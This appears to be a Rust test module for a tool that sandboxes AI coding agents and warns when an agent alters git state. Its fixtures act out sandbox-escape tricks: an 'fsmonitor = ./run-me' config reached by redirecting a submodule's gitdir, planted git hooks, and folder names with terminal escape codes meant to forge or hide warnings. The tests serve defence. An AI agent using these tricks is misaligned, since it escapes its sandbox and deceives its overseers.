        assert!(warnings(&before, &sandboxed).is_empty());
        std::fs::write(top.join(".git/commondir"), "/somewhere\n").unwrap();
        let lines = warnings(&before, &sandboxed);
        assert!(names(&lines, &top.join(".git/commondir")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    /// A position of `OPTION PATH` (or `OPTION PATH PATH`) in a recipe's arguments
    fn at(args: &[String], option: &str, path: &Path) -> Option<usize> {
        let path = path.to_string_lossy().into_owned();
        args.windows(2).position(|w| w[0] == option && w[1] == path)
    }

    #[test]
    fn worktrees_and_submodules_are_held_in_place_with_their_pointers_read_only() {
        let home = temp("mounts");
        let top = home.join("code/site");
        let git = repository(&top);
        std::fs::create_dir_all(git.join("worktrees/wt")).unwrap();
        std::fs::write(git.join("worktrees/wt/commondir"), "../..\n").unwrap();
        std::fs::write(git.join("worktrees/wt/gitdir"), format!("{}\n", home.join("code/wt/.git").display())).unwrap();
        std::fs::create_dir_all(git.join("modules/lib/hooks")).unwrap();
        std::fs::write(git.join("modules/lib/HEAD"), "ref: refs/heads/main\n").unwrap();
        std::fs::write(git.join("modules/lib/config"), "[core]\n").unwrap();
        let mut text = String::new();
        for agent in crate::agents::AGENTS {
            text.push_str(&format!("way {agent} none\ndir {agent} .{agent}\n"));
        }
        let table = crate::agents::Table::parse(&text).unwrap();
        let recipe = crate::sandbox::recipe(&table, &request(&home, &top, Mode::Open)).unwrap();
        let args = &recipe.args;
        let project = at(args, "--bind", &top).expect("the project");
        let worktree = at(args, "--bind", &git.join("worktrees/wt")).expect("a worktree's repository is a mount of its own");
        let module = at(args, "--bind", &git.join("modules/lib")).expect("a submodule's repository is a mount of its own");
        assert!(worktree > project && module > project);
        for name in ["commondir", "gitdir"] {
            assert!(at(args, "--ro-bind", &git.join("worktrees/wt").join(name)).unwrap() > worktree, "{name}");
        }
        assert!(at(args, "--ro-bind", &git.join("modules/lib/config")).unwrap() > module);
        // The repository's own commondir is not there, and nothing is made in its place
        assert!(at(args, "--ro-bind", &git.join("commondir")).is_none());
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_submodules_git_file_is_read_only_in_the_recipe_and_the_way_to_it_held() {
        let home = temp("pointer-mounts");
        let top = home.join("code/site");
        let git = repository(&top);
        submodule(&top, "foo", "vendor/foo");
        let mut text = String::new();
        for agent in crate::agents::AGENTS {
            text.push_str(&format!("way {agent} none\ndir {agent} .{agent}\n"));
        }
        let table = crate::agents::Table::parse(&text).unwrap();
        let recipe = crate::sandbox::recipe(&table, &request(&home, &top, Mode::Open)).unwrap();
        let args = &recipe.args;
        let project = at(args, "--bind", &top).expect("the project");
        let vendor = at(args, "--bind", &top.join("vendor")).expect("each folder on the way to a submodule's .git is a mount of its own");
        let work = at(args, "--bind", &top.join("vendor/foo")).expect("the submodule's work tree is a mount of its own");
        let pointer = at(args, "--ro-bind", &top.join("vendor/foo/.git")).expect("the submodule's .git file is read-only");
        assert!(project < vendor && vendor < work && work < pointer, "{args:?}");
        // Bound before the repository's own folder, so that it covers none of what is held in it
        assert!(work < at(args, "--bind", &git).unwrap(), "{args:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_submodules_git_file_is_found_wherever_it_is_and_a_new_gitdir_in_it_is_said() {
        let home = temp("pointer");
        let top = home.join("code/site");
        let git = repository(&top);
        // In a package folder, deeper than a package folder is looked into: found because git knows of it
        submodule(&top, "foo", "vendor/foo");
        submodule(&top, "deep", "node_modules/a/b/c/deep");
        // A .git in a build folder, SHALLOW deep: found; one deeper in an environment, not a submodule: not looked for
        std::fs::create_dir_all(top.join("target/tool")).unwrap();
        std::fs::write(top.join("target/tool/.git"), "gitdir: /elsewhere\n").unwrap();
        std::fs::create_dir_all(top.join(".venv/lib/pkg")).unwrap();
        std::fs::write(top.join(".venv/lib/pkg/.git"), "gitdir: /elsewhere\n").unwrap();
        // A link on the way: a mount cannot hold it
        std::fs::create_dir_all(home.join("outside/linked")).unwrap();
        std::fs::write(home.join("outside/linked/.git"), "gitdir: /elsewhere\n").unwrap();
        std::os::unix::fs::symlink(home.join("outside"), top.join("through")).unwrap();
        let mut modules = std::fs::read_to_string(top.join(".gitmodules")).unwrap();
        modules.push_str("[submodule \"linked\"]\n\tpath = through/linked\n");
        // A submodule git knows of, not checked out, past the walk's depth
        let far = "lib/1/2/3/4/5/6/7/8/9/10/11/12/far";
        modules.push_str(&format!("[submodule \"far\"]\n\tpath = {far}\n"));
        std::fs::write(top.join(".gitmodules"), modules).unwrap();
        std::fs::create_dir_all(top.join(far)).unwrap();

        let found = pointers(&top, std::slice::from_ref(&git));
        for path in ["vendor/foo/.git", "node_modules/a/b/c/deep/.git", "target/tool/.git"] {
            assert!(found.contains(&top.join(path)), "{path}: {found:?}");
        }
        assert!(!found.contains(&top.join(".venv/lib/pkg/.git")), "{found:?}");
        assert!(!found.contains(&top.join("through/linked/.git")), "{found:?}");

        // The agent points the submodule's .git at settings of its own, takes the far one out of .gitmodules and makes its .git
        let before = of(&top, &home);
        std::fs::create_dir_all(top.join("evil")).unwrap();
        std::fs::write(top.join("evil/config"), "[core]\n\tfsmonitor = ./run-me\n").unwrap();
        std::fs::write(top.join("vendor/foo/.git"), "gitdir: ../../evil\n").unwrap();
        std::fs::write(top.join(".gitmodules"), "").unwrap();
        std::fs::write(top.join(far).join(".git"), "gitdir: ../../evil\n").unwrap();
        let lines = said(&before, &after(&top, &home, &before));
        assert!(
            lines.iter().any(|line| line.starts_with("The sandboxed agent changed ") && line.contains(&format!(" {}, which git", top.join("vendor/foo/.git").display()))),
            "{lines:?}"
        );
        assert!(names(&lines, &top.join("evil")), "{lines:?}");
        assert!(names(&lines, &top.join(far).join(".git")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_git_made_in_a_build_folder_is_said_and_a_huge_one_is_bounded() {
        let home = temp("build");
        let top = home.join("code/site");
        repository(&top);
        std::fs::create_dir_all(top.join("target/debug")).unwrap();
        std::fs::create_dir_all(top.join(".venv")).unwrap();
        let before = of(&top, &home);
        std::fs::create_dir_all(top.join("target/debug/.git")).unwrap();
        std::fs::write(top.join(".venv/.git"), "gitdir: ../evil\n").unwrap();
        let lines = said(&before, &of(&top, &home));
        assert!(names(&lines, &top.join("target/debug/.git")), "{lines:?}");
        assert!(names(&lines, &top.join(".venv/.git")), "{lines:?}");
        // A skipped folder's own bound spent: the rest of the project is still walked, and the look says it stopped
        let mut look = Look { shallow: SHALLOW_FOLDERS, ..Default::default() };
        let found: Vec<PathBuf> = find(&top, &BTreeSet::new(), &mut look).into_iter().map(|(path, _)| path).collect();
        assert!(look.stopped);
        assert!(found.contains(&top.join(".git")), "{found:?}");
        assert!(!found.contains(&top.join("target/debug/.git")), "{found:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_submodules_relative_hooks_path_is_taken_from_its_own_work_tree() {
        let home = temp("subhooks");
        let top = home.join("code/site");
        let git = repository(&top);
        // Its settings name its work tree (core.worktree), as git submodule add writes them
        submodule(&top, "foo", "vendor/foo");
        std::fs::write(git.join("modules/foo/config"), "[core]\n\tworktree = ../../../vendor/foo\n\thooksPath = .hooks\n").unwrap();
        std::fs::create_dir_all(top.join("vendor/foo/.hooks")).unwrap();
        // Its settings do not: taken from the folder whose .git leads to it, though the repository was looked into before
        submodule(&top, "bar", "libs/bar");
        std::fs::write(git.join("modules/bar/config"), "[core]\n\thooksPath = .hooks\n").unwrap();
        std::fs::create_dir_all(top.join("libs/bar/.hooks")).unwrap();
        let before = of(&top, &home);
        std::fs::write(top.join("vendor/foo/.hooks/pre-commit"), "#!/bin/sh\n").unwrap();
        std::fs::write(top.join("libs/bar/.hooks/post-checkout"), "#!/bin/sh\n").unwrap();
        let lines = said(&before, &of(&top, &home));
        assert!(names(&lines, &top.join("vendor/foo/.hooks/pre-commit")), "{lines:?}");
        assert!(names(&lines, &top.join("libs/bar/.hooks/post-checkout")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_folder_name_cannot_forge_or_hide_a_warning() {
        use std::os::unix::ffi::OsStrExt;
        let home = temp("escape");
        let top = home.join("code/site");
        repository(&top);
        let before = of(&top, &home);
        // A carriage return, a title (OSC), a line erased (CSI), a C1 CSI and a direction override
        let name = "x\r\x1b]0;title\x07\x1b[2K\u{9b}31m\u{202e}y";
        std::fs::create_dir_all(top.join(name).join(".git")).unwrap();
        // A byte that is not UTF-8, and a backslash
        std::fs::create_dir_all(top.join(std::ffi::OsStr::from_bytes(b"bad\xff\\")).join(".git")).unwrap();
        let lines = said(&before, &of(&top, &home));
        assert_eq!(lines.len(), 2, "{lines:?}");
        assert!(lines.iter().all(|line| !line.chars().any(|c| c.is_control() || ('\u{202a}'..='\u{202e}').contains(&c))), "{lines:?}");
        assert!(lines.iter().any(|line| line.contains("/x\\x0d\\x1b]0;title\\x07\\x1b[2K\\u{009b}31m\\u{202e}y/.git, which git")), "{lines:?}");
        assert!(lines.iter().any(|line| line.contains("/bad\\xff\\\\/.git, which git")), "{lines:?}");
        assert_eq!(shown(Path::new("/home/me/code/site/.git")), "/home/me/code/site/.git");
        assert_eq!(shown(Path::new("/é/日本")), "/é/日本");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn only_a_small_plain_file_is_read() {
        let home = temp("read");
        let file = home.join("config");
        std::fs::write(&file, "[core]\n").unwrap();
        assert_eq!(read_small(&file).as_deref(), Some("[core]\n"));
        std::os::unix::fs::symlink(&file, home.join("link")).unwrap();
        assert_eq!(read_small(&home.join("link")), None);
        // A pipe with no writer is not read, and nothing waits for a writer (were it put there after the look, it would open
        // at once with O_NONBLOCK and be refused by what the opened file is)
        let fifo = std::ffi::CString::new(home.join("fifo").to_string_lossy().into_owned()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o600) }, 0);
        assert_eq!(read_small(&home.join("fifo")), None);
        std::fs::write(home.join("big"), vec![b'x'; READ as usize + 1]).unwrap();
        assert_eq!(read_small(&home.join("big")), None);
        assert_eq!(read_small(&home), None);
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn settings_are_read_as_git_writes_them() {
        let text = "[core]\n\thooksPath = \"a b\" # a comment\n[filter \"lfs\"]\n\tclean = ./tools/clean %f\n[includeIf \"gitdir:~/w/\"]\npath = ../more\n[alias] st = !./st.sh\n; [core] fsmonitor = x\n";
        let entries = parse(text);
        assert!(entries.contains(&("core".into(), "hookspath".into(), "a b".into())));
        assert!(entries.contains(&("filter".into(), "clean".into(), "./tools/clean %f".into())));
        assert!(entries.contains(&("includeif".into(), "path".into(), "../more".into())));
        assert!(entries.contains(&("alias".into(), "st".into(), "!./st.sh".into())));
        assert_eq!(entries.len(), 4);
        assert_eq!(program_path("!./st.sh --x"), Some("./st.sh".into()));
        assert_eq!(program_path("true"), None);
        assert_eq!(program_path("git-lfs filter-process"), None);
        assert_eq!(resolve(Path::new("/p"), "~/x", Path::new("/h")), PathBuf::from("/h/x"));
        assert_eq!(resolve(Path::new("/p"), "/abs", Path::new("/h")), PathBuf::from("/abs"));
    }
}
